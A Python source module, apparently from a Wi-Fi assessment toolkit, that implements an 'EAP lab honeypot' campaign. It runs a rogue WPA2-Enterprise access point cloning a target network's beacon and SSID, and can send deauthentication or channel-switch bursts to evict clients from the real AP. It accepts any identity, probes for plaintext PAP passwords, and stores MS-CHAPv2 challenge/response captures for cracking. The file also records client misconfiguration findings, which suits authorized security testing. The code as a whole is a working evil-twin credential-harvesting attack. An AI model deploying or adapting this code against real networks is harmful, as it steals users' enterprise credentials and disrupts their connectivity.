"""PEAP / MS-CHAPv2 EAP lab honeypot for authorized Enterprise assessments."""
from __future__ import annotations

import asyncio
import logging
import struct
import time
from contextlib import AsyncExitStack
from dataclasses import dataclass, field, replace
from pathlib import Path
from types import SimpleNamespace

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eap_lab_assessment import (
    ClientOutcome,
    EapLabClientRecord,
    order_eap_methods,
)
from wifit3.campaigns.eap_lab_config import (
    EapLabLaunchConfig,
    advertised_lab_ssid,
    resolve_lab_radio,
)
from wifit3.campaigns.eap_lab_tls import ensure_lab_tls_material
from wifit3.campaigns.eviltwin.campaign import csa_target_channel, default_punt_modes
from wifit3.campaigns.eviltwin.punter import Punter
from wifit3.campaigns.open_probe_ap import OPEN_PROBE_TIMEOUT_S, OpenProbePhase
from wifit3.campaigns.peap_server import (
    EapLabServerSession,
    _identity_payload,
    _method_name,
    describe_eap_tls_payload,
)
from wifit3.chips.driver import FakeMacSupport
from wifit3.crack.mschapv2 import MsChapV2Capture, is_complete_mschapv2_capture
from wifit3.dot11.ap import assoc_resp, auth_resp, beacon_clone_enterprise, probe_resp_from_beacon
from wifit3.dot11.dhcp import (
    build_lab_ack,
    build_lab_offer,
    lab_dhcp_client_ip,
    parse_client_dhcp,
)
from wifit3.dot11.eap import (
    EAP_FAILURE,
    EAP_REQUEST,
    EAP_RESPONSE,
    EAP_TYPE_IDENTITY,
    EAP_TYPE_NAK,
    EAP_TYPE_PEAP,
    EAP_TYPE_TLS,
    EAP_TYPE_TTLS,
)
from wifit3.dot11.eapol import LLC_SNAP_EAPOL
from wifit3.dot11.ie import GENERIC_ENTERPRISE_RSN_IE, beacon_rsn_ie, force_eap_akm
from wifit3.dot11.mac import mac_to_str, str_to_mac
from wifit3.dot11.parser import WlanFrameParser
from wifit3.dot11.probe import probe_resp, wpa2_beacon
from wifit3.models import AccessPoint
from wifit3.persist.common import bssid_to_dashed, safe_ssid
from wifit3.persist.config import Config
from wifit3.persist.pcap import PcapWriter
from wifit3.persist.private_files import ensure_private_directory

logger = logging.getLogger(__name__)

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000
_PCAP_MAX_BYTES = 64 * 1024 * 1024


@dataclass(slots=True)
class PeapClientState:
    phase: OpenProbePhase = OpenProbePhase.WAITING
    session: EapLabServerSession | None = None
    captures: list[MsChapV2Capture] = field(default_factory=list)
    record: EapLabClientRecord | None = None
    dhcp_offered_ip: str | None = None
    dhcp_xid: int | None = None
    dhcp_acked: bool = False
    mac: bytes = b""
    identity_sent_at: float = 0.0
    method_sent_at: float = 0.0
    eap_started: bool = False
    cert_wait_logged: bool = False


class PeapHoneypotCampaign(Campaign):
    key = "peap-honeypot"
    idle_label = "EAP Lab"
    run_label = "Stop EAP Lab"

    def __init__(
        self,
        array,
        ap: AccessPoint,
        *,
        timeout: float = OPEN_PROBE_TIMEOUT_S * 5,
        bssid: bytes | None = None,
        launch: EapLabLaunchConfig | None = None,
    ) -> None:
        super().__init__(ap, array)
        self.target_ap = ap
        self._launch = launch or EapLabLaunchConfig(timeout=int(timeout))
        if timeout != self._launch.timeout:
            self._launch = replace(self._launch, timeout=int(timeout))
        self.target_ssid = ap.ssid or ""
        self.ssid = advertised_lab_ssid(self.target_ssid, self._launch)
        members = list(getattr(array, "members", None) or [])
        picked, channel = resolve_lab_radio(
            members,
            iface_name=self._launch.iface_name,
            lab_channel=self._launch.lab_channel,
            target_channel=ap.channel,
        )
        self.channel = channel
        self._iface = picked
        self.timeout = max(30.0, float(self._launch.timeout))
        self.result = "no-interface"
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self._events: list[str] = []
        self._tx_tasks: set[asyncio.Task] = set()
        self._rx_bindings: list[tuple] = []
        self._clients: dict[str, PeapClientState] = {}
        self._saved_keys: set[tuple[str, str, str]] = set()
        self._saved_cred_keys: set[tuple[str, str]] = set()
        self.pending_captures: list[MsChapV2Capture] = []
        self.pending_credentials: list[tuple[str, str]] = []
        self.bssid = bssid or self._derive_lab_bssid(ap.bssid)
        self.bssid_text = mac_to_str(self.bssid)
        self._real_bssid = str_to_mac(ap.bssid)
        self._seen_notes: set[tuple[str, str]] = set()
        self._aio_loop: asyncio.AbstractEventLoop | None = None
        self._beacons_sent = 0
        self._rx_frames = 0
        self._pcap: PcapWriter | None = None
        self.pcap_path: str | None = None

        pmf_capable = bool(ap.pmf_capable or ap.pmf_required)
        real_beacon = ap.last_beacon_frame
        if real_beacon:
            self.beacon = beacon_clone_enterprise(
                real_beacon,
                self.channel,
                self.bssid,
                pmf_capable=pmf_capable,
                narrow_to_20mhz=False,
                ssid=self.ssid,
            )
            self.probe_response = probe_resp_from_beacon(self.beacon)
            self.rsn_ie = beacon_rsn_ie(self.beacon) or GENERIC_ENTERPRISE_RSN_IE
            self.rsn_source = "cloned target beacon (Enterprise RSN)"
        else:
            rsn_ie = getattr(ap, "rsn_ie", None)
            if rsn_ie:
                self.rsn_ie = force_eap_akm(rsn_ie, pmf_capable=pmf_capable) or GENERIC_ENTERPRISE_RSN_IE
                self.rsn_source = "parsed Enterprise RSN (no live beacon)"
            else:
                self.rsn_ie = GENERIC_ENTERPRISE_RSN_IE
                self.rsn_source = "generic 802.1X/CCMP"
            self.probe_response = probe_resp(
                self.bssid, self.ssid, self.channel, self.rsn_ie, b"",
            )
            self.beacon = wpa2_beacon(
                self.bssid, self.ssid, self.channel, self.rsn_ie, b"",
            )

        lab_dir = Path(Config.captures_dir).parent / "eap_lab"
        ensure_private_directory(lab_dir)
        self._tls_material = ensure_lab_tls_material(
            lab_dir,
            request_client_cert=self._launch.request_client_cert,
            dns_names=(self.ssid, "WiFiT3-EAP-Lab"),
        )
        self._punter: Punter | None = None
        if self._launch.eviction and ap.last_beacon_frame:
            modes = default_punt_modes(ap)
            csa_channel = csa_target_channel(ap.channel, ap.channel)
            self._punter = Punter(
                modes,
                ap.last_beacon_frame,
                str_to_mac(ap.bssid),
                csa_channel,
                self.bssid,
                ap.channel,
                ap.channel,
            )

        self.stats = type("Stats", (), {"events": self._events, "phase": OpenProbePhase.WAITING})()

    @staticmethod
    def _derive_lab_bssid(real_bssid: str) -> bytes:
        raw = bytearray(str_to_mac(real_bssid))
        raw[0] |= 0x02
        raw[5] = (raw[5] + 1) & 0xFF
        return bytes(raw)

    def _spoofable_candidates(self) -> list:
        if self.array is None:
            return []
        return [
            member
            for member in self.array.members
            if self.channel in member.supported_channels
            and member.driver.FAKE_MAC is FakeMacSupport.SPOOFABLE
        ]

    @property
    def iface(self):
        if self._iface is None and self.array is not None:
            picked, _channel = resolve_lab_radio(
                list(self.array.members),
                iface_name=self._launch.iface_name,
                lab_channel=self.channel,
                target_channel=self.target_ap.channel,
            )
            self._iface = picked
        return self._iface

    async def _loop(self) -> None:
        if self.iface is None:
            return
        self.result = "running"
        self.started_at = time.monotonic()
        self._open_pcap()
        self._event(
            f"EAP lab started · {self.ssid} · CH {self.channel} · "
            f"{self.iface.name} · BSSID {self.bssid_text} · "
            f"PEAP/TTLS/TLS · {int(self.timeout)}s"
        )
        self._event(f"RSN profile · {self.rsn_source}")
        if self.ssid == self.target_ssid:
            self._event(
                f"Join twin {self.bssid_text} - same SSID as "
                f"{mac_to_str(self._real_bssid)}. Phones hide it; forget "
                f"{self.target_ssid} or enable a distinct lab SSID."
            )
        else:
            self._event(
                f"Lab SSID {self.ssid} on {self.bssid_text} · "
                f"real {self.target_ssid} stays on {mac_to_str(self._real_bssid)}"
            )
        if self.channel != self.target_ap.channel:
            self._event(
                f"Lab radio {self.iface.name if self.iface else '?'} · "
                f"CH {self.channel} · real AP stays on CH {self.target_ap.channel}"
            )
            if self._launch.eviction:
                self._event(
                    "Eviction still aims at the real AP channel - "
                    "this card cannot punt off-channel"
                )
        if self._launch.security_assessment:
            parts = ["client security assessment ON"]
            if self._launch.weak_outer_first:
                parts.append("weak outer EAP first")
            if self._launch.probe_inner_pap:
                parts.append("inner PAP vuln test (credentials → Vault)")
            if self._launch.probe_empty_mschap:
                parts.append("empty MS-CHAPv2 probe")
            if self._launch.lab_dhcp:
                parts.append("lab DHCP Offer/ACK")
            self._event(" · ".join(parts))
        if self._launch.request_client_cert:
            self._event(
                "TLS · CertificateRequest only on EAP-TLS · "
                "PEAP/TTLS never ask for a user certificate"
            )
        else:
            self._event(
                "TLS · iPhone first-join · RSA PEAP leaf "
                f"{self.ssid} · one EAP frame for ServerHello · "
                "any identity accepted · user shown · PAP probe then MS-CHAPv2 · "
                "complete MS-CHAPv2 → Vault"
            )
        if self._punter is not None:
            mode_text = "+".join(mode.value for mode in self._punter.modes)
            self._event(
                f"Eviction enabled · {mode_text} every {int(self._launch.punt_period_sec)}s"
            )
        elif self._launch.eviction:
            self._event("Eviction requested but no target beacon is available")
        own_ap = self.array.register_own_fake_ap(
            self.bssid_text,
            self.ssid,
            self.channel,
            "WPA2-EAP",
        )
        own_ap.last_beacon_frame = self.beacon
        own_ap.akms = ["EAP"]
        own_ap.akm_suites = [1]
        self.array.register_own_mac(self.bssid)
        async with AsyncExitStack() as stack:
            await stack.enter_async_context(self.array.claim(self.iface))
            await stack.enter_async_context(
                self.array.lease(
                    channel=self.channel,
                    fake_mac=self.bssid,
                    bssid=self.bssid,
                    iface=self.iface,
                ),
            )
            self._aio_loop = asyncio.get_running_loop()
            callback = self._rx_callback
            self.iface.register_rx_callback(callback)
            self._rx_bindings.append((self.iface, callback))
            capture = Path(self.pcap_path).name if self.pcap_path else "off"
            self._event(
                f"RX armed on {self.iface.name} · join {self.ssid} · "
                f"capture {capture}"
            )
            try:
                deadline = self.started_at + self.timeout
                last_punt = time.monotonic()
                last_beat = 0.0
                while not self.stopped and time.monotonic() < deadline:
                    beacon = self._restamp(self.beacon)
                    if await self.iface.send_no_wait(beacon):
                        self._beacons_sent += 1
                        self._capture_frame(beacon)
                        self.array.record_own_fake_ap_beacon(self.bssid_text)
                    now = time.monotonic()
                    if now - last_beat >= 10.0:
                        heard = getattr(self.iface, "received_frames", 0)
                        clients = ", ".join(self._clients) if self._clients else "0 client(s)"
                        if self._clients:
                            clients = f"{len(self._clients)} client(s) · {clients}"
                        pcap_n = self._pcap.count if self._pcap is not None else 0
                        pcap_name = Path(self.pcap_path).name if self.pcap_path else ""
                        extra = ""
                        if self.pcap_path:
                            extra = f" · pcap {pcap_n} · {pcap_name}"
                        self._event(
                            f"listening · {self._beacons_sent} beacons · "
                            f"{heard} rx · {clients}{extra}"
                        )
                        last_beat = now
                    self._retry_eap_requests(now)
                    self._note_cert_wait(now)
                    if (
                        self._punter is not None
                        and now - last_punt >= self._launch.punt_period_sec
                    ):
                        if self._lab_handshake_active():
                            self._note(
                                "*",
                                "eviction-paused",
                                "Eviction paused · a client is in the lab handshake",
                            )
                        else:
                            await self._punter.punt(self.iface, self._target_clients())
                            last_punt = now
                            self._event(
                                "Eviction burst toward the REAL AP "
                                f"{mac_to_str(self._real_bssid)} (not the lab twin)"
                            )
                    await asyncio.sleep(_BEACON_PERIOD_S)
            finally:
                self.iface.unregister_rx_callback(callback)
                self._rx_bindings.clear()
                await self._drain_tx_tasks()
                self._close_pcap()
        self.array.finish_own_fake_ap(self.bssid_text)
        self.array.unregister_own_mac(self.bssid)
        self.finished_at = time.monotonic()
        misconfigured = any(
            state.record is not None
            and state.record.outcome not in (ClientOutcome.UNKNOWN, ClientOutcome.REJECTED_LAB)
            for state in self._clients.values()
        )
        if self.pending_captures:
            self.result = "captured"
        elif misconfigured:
            self.result = "misconfigured"
        else:
            self.result = "stopped" if self.stopped else "timeout"

    async def teardown(self) -> None:
        await self._drain_tx_tasks()
        for radio, callback in self._rx_bindings:
            radio.unregister_rx_callback(callback)
        self._rx_bindings.clear()
        self._close_pcap()
        self.finished_at = self.finished_at or time.monotonic()

    def _rx_callback(self, packet) -> None:
        self._capture_frame(getattr(packet, "raw", b""))
        try:
            self._dispatch(packet)
        except Exception:
            logger.exception("EAP lab RX handler failed")
            self._event("RX handler error - see wifit3 log")

    def _note(self, client_text: str, kind: str, message: str) -> None:
        key = (client_text, kind)
        if key in self._seen_notes:
            return
        self._seen_notes.add(key)
        self._event(message)

    def _for_us(self, raw: bytes, packet) -> bool:
        if raw[4:10] == self.bssid or raw[16:22] == self.bssid:
            return True
        bssid = (getattr(packet, "bssid", None) or "").casefold()
        dest = (getattr(packet, "dest", None) or "").casefold()
        return bssid == self.bssid_text or dest == self.bssid_text

    def _accept_client(self, source: bytes, source_text: str) -> PeapClientState:
        self._advance(source_text, OpenProbePhase.ASSOCIATED)
        state = self._clients.setdefault(source_text, PeapClientState())
        state.mac = source
        if state.session is None:
            state.session = self._new_session()
        return state

    def _kickoff_eap(self, source: bytes, source_text: str) -> None:
        state = self._accept_client(source, source_text)
        if state.session is None:
            return
        result = state.session.on_eapol_start(self.bssid, source)
        state.identity_sent_at = time.monotonic()
        self._send_session_result(source_text, result)

    def _retry_eap_requests(self, now: float) -> None:
        for source_text, state in list(self._clients.items()):
            if (
                state.phase < OpenProbePhase.ASSOCIATED
                or not state.mac
                or state.session is None
            ):
                continue
            if not state.eap_started:
                if state.identity_sent_at and now - state.identity_sent_at < 2.0:
                    continue
                result = state.session.on_eapol_start(self.bssid, state.mac)
                state.identity_sent_at = now
                if result.detail:
                    result.detail = f"{result.detail} (retry)"
                self._send_session_result(source_text, result)
                continue
            if state.session.phase2_pending():
                if state.method_sent_at and now - state.method_sent_at < 2.0:
                    continue
                result = state.session.on_phase2_timeout(self.bssid, state.mac)
                state.method_sent_at = now
                self._send_session_result(source_text, result)
                continue
            if not state.session.method_offer_pending():
                continue
            if state.method_sent_at and now - state.method_sent_at < 2.0:
                continue
            result = state.session.on_method_timeout(self.bssid, state.mac)
            state.method_sent_at = now
            self._send_session_result(source_text, result)

    def _lab_handshake_active(self) -> bool:
        return any(
            OpenProbePhase.AUTHENTICATED <= state.phase < OpenProbePhase.EAPOL_M2
            for state in self._clients.values()
        )

    def _note_cert_wait(self, now: float) -> None:
        del now
        for source_text, state in self._clients.items():
            if state.cert_wait_logged or state.session is None:
                continue
            if state.session.awaiting_client_tls():
                state.cert_wait_logged = True
                self._event(
                    f"CLIENT {source_text} · waiting for client TLS · "
                    "iPhone often has no Certificate card · "
                    "lab will accept user, password and MS-CHAPv2 as sent"
                )

    def _dispatch(self, packet) -> None:
        raw = getattr(packet, "raw", b"")
        if len(raw) < 24:
            return
        self._rx_frames += 1
        source = raw[10:16]
        source_text = mac_to_str(source)
        dest = raw[4:10]
        type_id = (raw[0] & 0x0C) >> 2
        subtype = (raw[0] & 0xF0) >> 4
        if type_id == 2:
            if subtype & 0x04:
                return
            if self._for_us(raw, packet):
                self._on_data(packet, source, source_text)
            elif dest == self._real_bssid or raw[16:22] == self._real_bssid:
                if raw.find(LLC_SNAP_EAPOL) != -1:
                    self._note(
                        source_text,
                        "real-eapol",
                        f"CLIENT {source_text} · EAPOL to the REAL AP "
                        f"{mac_to_str(self._real_bssid)} - not twin {self.bssid_text}",
                    )
            return
        if type_id != 0:
            return
        if subtype == 0x04:
            self._on_probe(packet, source, source_text)
            return
        if dest == self._real_bssid and subtype in (0x0B, 0x00, 0x02):
            what = "auth" if subtype == 0x0B else "assoc"
            self._note(
                source_text,
                f"real-{what}",
                f"CLIENT {source_text} · {what} to the REAL AP "
                f"{mac_to_str(self._real_bssid)} - not twin {self.bssid_text}. "
                f"Forget {self.ssid} or join {self.bssid_text}",
            )
            return
        if not self._for_us(raw, packet):
            if subtype in (0x0B, 0x00, 0x02):
                what = "auth" if subtype == 0x0B else "assoc"
                self._note(
                    source_text,
                    f"other-{what}",
                    f"CLIENT {source_text} · {what} dest={mac_to_str(dest)} "
                    f"(twin {self.bssid_text})",
                )
            return
        if subtype == 0x0B:
            self._event(f"CLIENT {source_text} · ← Auth Open-System")
            self._advance(source_text, OpenProbePhase.AUTHENTICATED)
            self._tx(auth_resp(self.bssid, source))
            self._event(f"AP · → Auth Success · {source_text}")
        elif subtype in (0x00, 0x02):
            kind = "Reassoc" if subtype == 0x02 else "Assoc"
            self._event(
                f"CLIENT {source_text} · ← {kind} Request ({self.ssid}) · "
                f"associated to Enterprise lab AP"
            )
            self._tx(assoc_resp(self.bssid, source, channel=self.channel))
            self._event(f"AP · → {kind} Response (success) · {source_text}")
            self._kickoff_eap(source, source_text)
        elif subtype in (0x0A, 0x0C):
            kind = "Disassoc" if subtype == 0x0A else "Deauth"
            reason = int.from_bytes(raw[24:26], "little") if len(raw) >= 26 else 0
            self._event(
                f"CLIENT {source_text} · ← {kind} reason {reason} · "
                f"lab session ended"
            )

    def _on_data(self, packet, source: bytes, source_text: str) -> None:
        state = self._clients.get(source_text)
        raw = packet.raw
        if state is None or state.phase < OpenProbePhase.ASSOCIATED:
            if raw.find(LLC_SNAP_EAPOL) == -1:
                return
            self._event(f"CLIENT {source_text} · EAPOL before assoc - accepting")
            state = self._accept_client(source, source_text)
        parsed_dhcp = parse_client_dhcp(raw, source)
        if parsed_dhcp is not None:
            dhcp_msg, xid = parsed_dhcp
            record = self._client_record(source_text)
            if self._launch.lab_dhcp and self._launch.security_assessment:
                offered = state.dhcp_offered_ip or lab_dhcp_client_ip(source)
                if dhcp_msg == "discover":
                    state.dhcp_offered_ip = offered
                    state.dhcp_xid = xid
                    self._tx(build_lab_offer(self.bssid, source, xid, offered_ip=offered))
                    record.dhcp_offered_ip = offered
                    record.add_finding("dhcp_discover_on_lab")
                    record.set_outcome(ClientOutcome.DHCP_ON_LAB)
                    self._event(
                        f"CLIENT {source_text} · MISCONFIG · lab DHCP Offer {offered}"
                    )
                elif dhcp_msg == "request" and not state.dhcp_acked:
                    state.dhcp_acked = True
                    ack_ip = state.dhcp_offered_ip or offered
                    self._tx(build_lab_ack(self.bssid, source, xid, ack_ip))
                    record.dhcp_offered_ip = ack_ip
                    record.add_finding("dhcp_ack_on_lab")
                    record.set_outcome(ClientOutcome.DHCP_ON_LAB)
                    self._event(
                        f"CLIENT {source_text} · MISCONFIG · lab DHCP ACK {ack_ip}"
                    )
            else:
                label = "Discover" if dhcp_msg == "discover" else "Request"
                self._event(
                    f"CLIENT {source_text} · DHCP {label} on lab BSS (lab DHCP disabled)"
                )
            self._advance(source_text, OpenProbePhase.DHCP)
            return
        sig_idx = raw.find(LLC_SNAP_EAPOL)
        if sig_idx == -1 or len(raw) < sig_idx + 12:
            return
        dot1x = sig_idx + 8
        dot1x_type = raw[dot1x + 1]
        if state.session is None:
            state.session = self._new_session()
        self._note(
            source_text,
            f"eapol-{dot1x_type}",
            f"CLIENT {source_text} · EAPOL type {dot1x_type}",
        )
        if dot1x_type == 1:
            result = state.session.on_eapol_start(self.bssid, source)
            self._event(f"CLIENT {source_text} · ← EAPOL-Start")
            self._send_session_result(source_text, result)
            return
        parsed = WlanFrameParser.parse_80211_frame(raw, 0)
        if getattr(parsed, "type", "") != "eapol" or not hasattr(parsed, "eap_code"):
            parsed = self._eap_from_llc(raw, packet, sig_idx)
        if parsed is None or not hasattr(parsed, "eap_code"):
            self._note(
                source_text,
                "eapol-unparsed",
                f"CLIENT {source_text} · EAPOL not parsed ({len(raw)} B)",
            )
            return
        if parsed.eap_code not in (EAP_RESPONSE, EAP_FAILURE):
            self._note(
                source_text,
                f"eap-code-{parsed.eap_code}-{parsed.eap_type}",
                f"CLIENT {source_text} · ignored EAP code={parsed.eap_code} "
                f"type={parsed.eap_type} (not a response)",
            )
            return
        state.eap_started = True
        self._event(f"CLIENT {source_text} · {self._describe_eap_rx(parsed)}")
        result = state.session.on_eap(self.bssid, source, parsed)
        self._send_session_result(source_text, result)

    @staticmethod
    def _eap_from_llc(raw: bytes, packet, sig_idx: int):
        eap_start = sig_idx + 8 + 4
        if len(raw) < eap_start + 4:
            return None
        code = raw[eap_start]
        ident = raw[eap_start + 1]
        length = int.from_bytes(raw[eap_start + 2:eap_start + 4], "big")
        eap_type = (
            raw[eap_start + 4]
            if code in (EAP_REQUEST, EAP_RESPONSE) and len(raw) > eap_start + 4
            else None
        )
        data = bytes(raw[eap_start + 5: eap_start + min(length, len(raw) - eap_start)])
        return SimpleNamespace(
            type="eapol",
            eap_code=code,
            eap_identifier=ident,
            eap_type=eap_type,
            eap_data=data,
            raw=getattr(packet, "raw", raw),
        )

    def _send_session_result(self, client_text: str, result) -> None:
        for frame in result.outgoing:
            self._tx(frame)
        record = self._client_record(client_text)
        assess = self._launch.security_assessment
        if result.eap_method is not None:
            record.outer_eap_method = result.eap_method
            state = self._clients.get(client_text)
            if state is not None:
                state.method_sent_at = time.monotonic()
        if result.lab_credential is not None:
            user, password = result.lab_credential
            cred_key = (user.casefold(), password)
            if cred_key not in self._saved_cred_keys:
                self._saved_cred_keys.add(cred_key)
                self.pending_credentials.append(result.lab_credential)
                record.username = user or record.username
        if result.capture is not None:
            record.username = result.capture.username
            if is_complete_mschapv2_capture(result.capture):
                key = (
                    result.capture.username.casefold(),
                    result.capture.server_challenge.hex(),
                    result.capture.nt_response.hex(),
                )
                if key not in self._saved_keys:
                    self._saved_keys.add(key)
                    state = self._clients.setdefault(client_text, PeapClientState())
                    state.captures.append(result.capture)
                    self.pending_captures.append(result.capture)
                    self._advance(client_text, OpenProbePhase.EAPOL_M2)
                    record.add_finding("untrusted_server_mschapv2")
                    record.set_outcome(ClientOutcome.INNER_CAPTURED)
                    if assess:
                        self._event(
                            f"CLIENT {client_text} · MISCONFIG · MS-CHAPv2 · "
                            f"{result.capture.username}"
                        )
            elif result.misconfiguration == "empty_mschap_accepted":
                record.add_finding("empty_mschap_accepted", detail=result.detail)
                record.set_outcome(ClientOutcome.EMPTY_MSCHAP)
                self._event(
                    f"CLIENT {client_text} · MS-CHAPv2 empty NT-response · not saved to Vault"
                )
            else:
                self._event(
                    f"CLIENT {client_text} · MS-CHAPv2 incomplete · not saved to Vault"
                )
        elif result.complete:
            if result.misconfiguration == "inner_pap_accepted":
                record.add_finding("inner_pap_accepted", detail=result.detail)
                record.set_outcome(ClientOutcome.INNER_PAP)
            elif result.misconfiguration == "untrusted_server_eap_tls":
                record.add_finding("untrusted_server_eap_tls", detail=result.detail)
                record.set_outcome(ClientOutcome.EAP_SUCCESS)
            else:
                record.add_finding("rogue_eap_success", detail=result.detail)
                record.set_outcome(ClientOutcome.EAP_SUCCESS)
            if assess:
                self._event(
                    f"CLIENT {client_text} · MISCONFIG · completed rogue EAP "
                    f"({result.detail or 'EAP-Success'})"
                )
        if result.detail:
            record.last_detail = result.detail
            self._event(self._format_session_detail(client_text, result.detail))
        if result.client_cert_fingerprint:
            record.client_cert_sha256 = result.client_cert_fingerprint
            record.add_finding("eap_tls_client_cert_present")
            self._event(
                f"CLIENT {client_text} · EAP-TLS client certificate observed · "
                f"SHA-256 {result.client_cert_fingerprint[:16]}…"
            )
        if result.failed:
            if result.rejected_lab:
                record.set_outcome(ClientOutcome.REJECTED_LAB)
                record.add_finding("rejected_lab_tls", detail=result.detail)
                self._event(
                    f"CLIENT {client_text} · rejected lab (expected) · {result.detail}"
                )
            else:
                why = result.detail or "no EAP reply"
                self._event(f"CLIENT {client_text} · EAP negotiation failed · {why}")

    def _client_record(self, client_text: str) -> EapLabClientRecord:
        state = self._clients.setdefault(client_text, PeapClientState())
        if state.record is None:
            state.record = EapLabClientRecord(client_mac=client_text)
        return state.record

    @property
    def launch(self) -> EapLabLaunchConfig:
        return self._launch

    @property
    def client_assessments(self) -> tuple[EapLabClientRecord, ...]:
        records = [
            state.record
            for state in self._clients.values()
            if state.record is not None
        ]
        return tuple(records)

    def _new_session(self) -> EapLabServerSession:
        methods = self._launch.eap_methods
        if self._launch.security_assessment and self._launch.weak_outer_first:
            methods = order_eap_methods(methods, weak_outer_first=True)
        return EapLabServerSession(
            self._tls_material,
            eap_methods=methods,
            launch=self._launch,
        )

    def _target_clients(self) -> list[bytes]:
        from wifit3.campaigns.deauth_targets import associated_client_macs

        return [
            str_to_mac(mac)
            for mac in associated_client_macs(self.array, self.target_ap.bssid)
        ]

    def _on_probe(self, packet, source: bytes, source_text: str) -> None:
        ssid = getattr(packet, "ssid", None)
        if ssid not in (None, "", "<hidden>", self.ssid):
            return
        stamped = self._restamp(self.probe_response)
        response = stamped[:4] + source + stamped[10:]
        self._tx(response)
        if ssid == self.ssid:
            self._note(
                source_text,
                "probe",
                f"CLIENT {source_text} · directed probe for {self.ssid} · "
                f"answered as twin {self.bssid_text}",
            )

    def _advance(self, client_text: str, phase: OpenProbePhase) -> None:
        state = self._clients.setdefault(client_text, PeapClientState())
        if phase > state.phase:
            state.phase = phase
            self.stats.phase = max(self.stats.phase, phase)

    def _event(self, message: str) -> None:
        self._events.append(message)

    @staticmethod
    def _format_session_detail(client_text: str, detail: str) -> str:
        if detail.startswith("AP ·") or detail.startswith("CLIENT "):
            return detail
        if detail.startswith("→"):
            return f"AP · {detail}"
        if detail.startswith("←"):
            return f"CLIENT {client_text} · {detail}"
        return f"CLIENT {client_text} · {detail}"

    @staticmethod
    def _describe_eap_rx(parsed) -> str:
        ident = getattr(parsed, "eap_identifier", None)
        eap_type = getattr(parsed, "eap_type", None)
        data = getattr(parsed, "eap_data", b"") or b""
        id_part = f"id={ident}" if ident is not None else "id=?"
        if parsed.eap_code == EAP_FAILURE:
            return f"← EAP-Failure · {id_part}"
        if eap_type == EAP_TYPE_IDENTITY:
            identity = _identity_payload(parsed)
            label = identity.decode("utf-8", errors="replace").strip() or "?"
            return f"← Identity ({label}) · {id_part} · {4 + 1 + len(identity)} B"
        if eap_type == EAP_TYPE_NAK:
            naks = getattr(parsed, "eap_nak_types", ()) or tuple(data)
            offered = ", ".join(_method_name(int(item)) for item in naks) or "?"
            return f"← NAK · {id_part} · wants {offered}"
        name = _method_name(eap_type)
        if eap_type in (EAP_TYPE_PEAP, EAP_TYPE_TTLS, EAP_TYPE_TLS):
            return f"← {name} · {id_part} · {describe_eap_tls_payload(data)}"
        return f"← {name} · {id_part} · {len(data)} B"

    def _open_pcap(self) -> None:
        if not self._launch.record_pcap or self._pcap is not None:
            if not self._launch.record_pcap:
                self._event("tcpdump capture OFF")
            return
        try:
            captures_dir = Path(Config.captures_dir)
            ensure_private_directory(captures_dir)
            name = (
                f"{safe_ssid(self.ssid)}_{bssid_to_dashed(self.bssid_text)}_"
                f"{int(time.time())}_packet_capture.pcap"
            )
            path = captures_dir / name
            self._pcap = PcapWriter(path, max_bytes=_PCAP_MAX_BYTES)
            self.pcap_path = str(path)
            self._event(
                f"tcpdump capture ON · {path} · libpcap 802.11 "
                f"(tcpdump -r {path.name})"
            )
        except Exception:
            logger.exception("EAP lab tcpdump capture unavailable")
            self._pcap = None
            self.pcap_path = None
            self._event("tcpdump capture failed - lab continues without pcap")

    def _capture_frame(self, frame: bytes) -> None:
        if self._pcap is None or not frame:
            return
        try:
            self._pcap.write(frame)
        except Exception:
            logger.debug("EAP lab pcap write failed", exc_info=True)

    def _close_pcap(self) -> None:
        writer, self._pcap = self._pcap, None
        if writer is None:
            return
        try:
            count, path = writer.count, writer.path
            writer.close()
            self._event(f"tcpdump capture saved · {count} frames → {path}")
        except Exception:
            logger.exception("EAP lab tcpdump capture close failed")

    def _tx(self, frame: bytes) -> None:
        self._capture_frame(frame)
        iface = self.iface
        loop = self._aio_loop
        if iface is None or loop is None or loop.is_closed():
            return

        def _start() -> None:
            task = loop.create_task(iface.send_no_wait(frame))
            self._tx_tasks.add(task)
            task.add_done_callback(self._tx_tasks.discard)

        try:
            running = asyncio.get_running_loop()
        except RuntimeError:
            running = None
        if running is loop:
            _start()
        else:
            loop.call_soon_threadsafe(_start)

    async def _drain_tx_tasks(self) -> None:
        pending = [task for task in self._tx_tasks if not task.done()]
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
        self._tx_tasks.clear()

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]
